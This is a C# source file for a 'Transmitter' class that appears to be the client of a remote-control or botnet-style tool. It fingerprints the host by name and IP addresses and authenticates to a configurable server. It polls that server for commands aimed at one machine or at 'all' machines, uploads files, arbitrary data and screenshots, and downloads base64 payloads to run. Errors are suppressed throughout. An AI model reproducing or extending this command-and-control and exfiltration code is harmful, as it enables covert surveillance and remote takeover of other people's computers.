using Library;
using Models;
using Newtonsoft.Json;
using RestSharp;
using RestSharp.Deserializers;
using RestSharp.Serializers;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.Serialization;
using System.Security.Cryptography;
using System.Text;

namespace Library
{
    public class Transmitter
    {
        public AuthResult Auth { get; private set; }
        public Settings TSettings { get; private set; }
        public Uri ApiUrl { get;  private set; }
        public string Data { get; set; }
        public string PrivateApiKey { get; set; }
        public string PublicApiKey { get; set; }
        private IRestClient client;
        RestSharp.Serializers.JsonSerializer serializer;
        JsonDeserializer deserializer;
        public int ConnectionTimeout { get; private set; }

        public IRestResponse Test(int id)
        {
            try
            {
                var request = new RestRequest("/values/{id}", Method.GET);
                request.AddUrlSegment("id", "" + id);
                //var request = new RestRequest("/values", Method.GET);
                request.RequestFormat = DataFormat.Json;
                return client.Execute(request);
            }
            catch { }
            return null;
        }

        public IRestResponse Test2(string str)
        {
            try
            {
                var request = new RestRequest("/values/foo/{str}", Method.GET);
                request.AddUrlSegment("str", "" + str);
                request.RequestFormat = DataFormat.Json;
                return client.Execute(request);
            }
            catch { }
            return null;
        }

        public Transmitter(Uri url, string privateApiKey, string publicApiKey, int connectionTimeout)
        {
            TSettings = new Settings();
            Auth = new AuthResult();
            serializer = new RestSharp.Serializers.JsonSerializer();
            deserializer = new JsonDeserializer();
            ApiUrl = url;
            Data = DateTime.Now.ToString("MMM ddd d HH:mm:ss yyyy");
            PrivateApiKey = privateApiKey;
            PublicApiKey = publicApiKey;
            ConnectionTimeout = connectionTimeout;
            Auth.Token = "";
            client = new RestClient(ApiUrl);
        }

        private string GetHashKey()
        {
            return General.Sha1Hash(Data + PrivateApiKey + PublicApiKey);
        }

        /// <summary>
        /// Authenticates using POST method
        /// </summary>
        /// <returns>Returns a valid Token value, if successfully authenticated, otherwise an empty string.</returns>
        public bool Authorize()
        {
            //IPAddress externalIpAddress = Net.GetExternalIpAddress(ConnectionTimeout);
            //if (externalIpAddress != IPAddress.Loopback)
            //{
            //    string hash = GetHashKey();
            //    var hostName = System.Net.Dns.GetHostName();
            //    var ipInternal = Convert.ToString(Net.GetInternalIpAddress());
            //    var ipExternal = Convert.ToString(externalIpAddress);
            //    var request = new RestRequest("/values/Authorize/{data}", Method.POST);
            //    var authData = new AuthData()
            //    {
            //        HostName = hostName,
            //        IpInternal = ipInternal,
            //        IpExternal = ipExternal,
            //        Data = Data,
            //        PublicKey = PublicApiKey,
            //        Hash = hash
            //    };
            //    request.AddObject(authData);
            //    var response = client.Execute(request);
            //    try
            //    {
            //        Auth = JsonConvert.DeserializeObject<AuthResult>(response.Content);// deserializer.Deserialize<AuthResult>(response);
            //        Auth.IpInternal = ipInternal;
            //        Auth.IpExternal = ipExternal;
            //        Auth.HostName = hostName;
            //    }
            //    catch
            //    {
            //        Auth.Token = "";
            //    }
            //}
            //else
            //{
            //    return false;// throw new Exception("External IP is a loopback IP Address!");
            //}

            try
            {
                var authData = GetAuthData();
                var request = new RestRequest("/values/Authorize/{data}", Method.POST);
                request.AddObject(authData);
                var response = client.Execute(request);
                Auth = JsonConvert.DeserializeObject<AuthResult>(response.Content);// deserializer.Deserialize<AuthResult>(response);
                Auth.IpInternal = authData.IpInternal;
                Auth.IpExternal = authData.IpExternal;
                Auth.HostName = authData.HostName;
            }
            catch
            {
                return false;
            }
            return Auth.IsAuthenticated;
        }

        public void DeAuthorize()
        {
            //IPAddress externalIpAddress = Net.GetExternalIpAddress(ConnectionTimeout);
            //if (externalIpAddress != IPAddress.Loopback)
            //{
            //    string hash = GetHashKey();
            //    var hostName = System.Net.Dns.GetHostName(); ;
            //    var ipInternal = Convert.ToString(Net.GetInternalIpAddress());
            //    var ipExternal = Convert.ToString(externalIpAddress);
            //    var request = new RestRequest("/values/DeAuthorize/{data}", Method.POST);
            //    request.AddObject(new AuthData()
            //    {
            //        HostName = hostName,
            //        IpInternal = ipInternal,
            //        IpExternal = ipExternal,
            //        Data = Data,
            //        PublicKey = PublicApiKey,
            //        Hash = hash
            //    });
            //    var response = client.Execute(request);
            //}
            //else
            //{
            //    throw new Exception("External IP is a loopback IP Address!");
            //}
            try
            {
                var authData = GetAuthData();
                var request = new RestRequest("/values/DeAuthorize/{data}", Method.POST);
                request.AddObject(authData);
                var response = client.Execute(request);
            }
            catch { }
        }

        public void UpdateLastActive()
        {
            try
            {
                var authData = GetAuthData();
                var request = new RestRequest("/values/UpdateLastActive/{data}", Method.POST);
                request.AddObject(authData);
                var response = client.Execute(request);
            }
            catch { }
        }

        AuthData GetAuthData()
        {
            IPAddress externalIpAddress = Net.GetExternalIpAddress(ConnectionTimeout);
            if (externalIpAddress != IPAddress.Loopback)
            {
                string hash = GetHashKey();
                var hostName = System.Net.Dns.GetHostName(); ;
                var ipInternal = Convert.ToString(Net.GetInternalIpAddress());
                var ipExternal = Convert.ToString(externalIpAddress);
                return new AuthData()
                {
                    HostName = hostName,
                    IpInternal = ipInternal,
                    IpExternal = ipExternal,
                    Data = Data,
                    PublicKey = PublicApiKey,
                    Hash = hash
                };
            }
            else
            {
                throw new Exception("External IP is a loopback IP Address!");
            }
        }

        public bool UploadFile(FileData data)
        {
            try
            {
                var request = new RestRequest("/values/UploadFile/{data}", Method.POST);
                data.ComputerHash = TSettings.ComputerHash;
                request.AddObject(data);
                var response = client.Execute(request);
                return response.Content != null && response.Content.Length > 0;
            }
            catch { }
            return false;
        }

        public void LoadSettings()
        {
            var request = new RestRequest("/values/GetSettings", Method.GET);
            request.Timeout = ConnectionTimeout;
            if (request.Attempts > 1)
                return;
            try
            {
                //request.AddParameter("token", Auth.Token);
                //request.RequestFormat = DataFormat.Json;
                var response = client.Execute(request);
                var computerHash = GetComputerHash(); //ef58f4251164fee675a5df4727891bc8b54eca96
                var newSettings = JsonConvert.DeserializeObject<Settings>(response.Content);
                // if the computer hash is equal to this computer then execute a command on that computer
                // if the hash is from "all", then execute a command on all of the computers
                if (newSettings.ComputerHash == computerHash || newSettings.ComputerHash == General.Sha1Hash("all"))
                {
                    TSettings = newSettings;
                }
            }
            catch (Exception ex) { }
        }

        public void SetHasExectuted(Settings settings)
        {
            settings.HasExectuted = true;
            var request = new RestRequest("/values/SaveSettings", Method.POST);
            try
            {
                request.AddParameter("settingsEncoded", settings);
                var response = client.Execute(request);
                //return response.StatusCode;
            }
            catch (Exception ex) { }
        }

        //todo: refactor
        public static string GetComputerHash(ComputerData data)
        {
            if (data == null)
                return null;

            return General.Sha1Hash(data.Name + data.IpExternal + data.IpInternal);
        }

        public string GetComputerHash()
        {
            return General.Sha1Hash(Auth.HostName + Auth.IpExternal + Auth.IpInternal);
        }

        public string UploadData(string filename, object objData, bool useCompression)
        {
            string content = String.Empty;
            try
            {
                var bytes = Encoding.Default.GetBytes(Convert.ToString(objData));
                var image = objData as Bitmap;
                if (image != null)
                {
                    bytes = image.ImageToByte();
                }
                var bytesToTransfer = useCompression ? Compression.Compress("file", bytes) : bytes;
                //bytesToTransfer = bytesToTransfer.Length < bytes.Length ? bytesToTransfer : bytes;
                var request = new RestRequest("/values/UploadFile/{data}", Method.POST);
                request.ReadWriteTimeout = 30000;
                request.Timeout = 30000;
                var data = new FileData(filename, bytesToTransfer, TSettings.ComputerHash);
                request.AddObject(data);
                var response = client.Execute(request);
                content = response.Content;
            }
            catch (Exception ex) { }
            return content;
        }

        public bool UploadImage(string fileName, Image bitmapImage, long quality)
        {
            try
            {
                var imgArray = Imaging.BitmapToJpeg(bitmapImage, quality);
                var request = new RestRequest("/values/UploadImage/{data}", Method.POST);
                var data = new ImageData()
                {
                    FileName = fileName,
                    Image = Convert.ToBase64String(imgArray),
                    Token = Auth.Token
                };
                data.ComputerHash = TSettings.ComputerHash;
                request.AddObject(data);
                var response = client.Execute(request);
                return response.Content != null && response.Content.Length > 0;
            }
            catch { }
            return false;
        }

        //public bool RegisterWithServer()
        //{
        //    try
        //    {
        //        var request = new RestRequest("/register/{data}", Method.POST);
        //        request.AddObject(new ComputerData()
        //        {
        //            Name = Auth.
        //        });
        //        var response = client.Execute(request);
        //        return response.Content != null && response.Content.Length > 0;
        //    }
        //    catch { }
        //    return false;
        //}

        //public string Upload(System.Drawing.Bitmap bitmap)
        //public string UploadImage(string name, string file)
        //{
        //    string content = String.Empty;
        //    try
        //    {
        //        var request = new RestRequest("/upload/image/{tokenValue}", Method.POST);
        //        request.AddUrlSegment("tokenValue", Auth.Token);
        //        request.RequestFormat = DataFormat.Json;
        //        request.AddFile("screenshot", file);
        //        var response = client.Execute(request);
        //        content = response.Content;
        //    }
        //    catch (Exception ex) { }
        //    return content;
        //}

        //public bool UploadFile(string name, string path)
        //{
        //    try
        //    {
        //        var request = new RestRequest("/uploadFile/{tokenValue}", Method.POST);
        //        request.AddUrlSegment("tokenValue", Auth.Token);
        //        request.RequestFormat = DataFormat.Json;
        //        request.AddFile("file", path);
        //        var response = client.Execute(request);
        //        return response.Content.Length > 0;
        //    }
        //    catch (Exception ex) { }
        //    return false;
        //}

        //public ECommand GetCommand()
        //{
        //    var command = ECommand.DO_NOTHING;
        //    var request = new RestRequest("/command/{tokenValue}", Method.GET);
        //    request.Timeout = ConnectionTimeout;
        //    if (request.Attempts > 1)
        //        return command;
        //    try
        //    {
        //        request.AddUrlSegment("tokenValue", Auth.Token);
        //        request.RequestFormat = DataFormat.Json;
        //        var response = client.Execute(request);
        //        TSettings = deserializer.Deserialize<Settings>(response);
        //        // if the computer hash is equal to this computer then execute a command on that computer
        //        // if the hash is from "all", then execute a command on all of the computers
        //        if (TSettings.ComputerHash == GetComputerHash() || TSettings.ComputerHash == General.Sha1Hash("all"))
        //        {
        //            command = TSettings.Command;
        //        }
        //    }
        //    catch (Exception ex) { }
        //    return command;
        //}

        //public void RegisterWithServer()
        //{
        //    try
        //    {
        //        var request = new RestRequest("/register/{ipExternal}/{ipInternal}/{hostName}/{tokenValue}", Method.GET);
        //        request.AddUrlSegment("ipExternal", Auth.IpExternal);
        //        request.AddUrlSegment("ipInternal", Auth.IpInternal);
        //        request.AddUrlSegment("hostName", Auth.HostName);
        //        request.AddUrlSegment("tokenValue", Auth.Token);
        //        request.RequestFormat = DataFormat.Json;
        //        var response = client.Execute(request);
        //    }
        //    catch (Exception ex) { }
        //}

        public byte[] DownloadFile()
        {
            byte[] result = null;
            try
            {
                var request = new RestRequest("/values/DownloadFile/{settings}", Method.POST);
                request.AddObject(TSettings);
                var response = client.Execute(request);
                // if the computer hash is equal to this computer then execute a command on that computer
                // if the hash is from "all", then execute a command on all of the computers
                if (TSettings.ComputerHash == GetComputerHash() || TSettings.ComputerHash == General.Sha1Hash("all"))
                {
                    var data = JsonConvert.DeserializeObject<string>(response.Content);
                    result = Convert.FromBase64String(data);
                }
            }
            catch (Exception ex) { }
            return result;
        }

        public class FileDownloadInfo
        {
            public string FileName { get; set; }
            public string FileData { get; set; }
            public FileDownloadInfo() { }
        }

        public class ProcessCommand
        {
            public string FileName { get; set; }
            public string FileArgs { get; set; }
            public ProcessCommand() { }
        }
    }
}
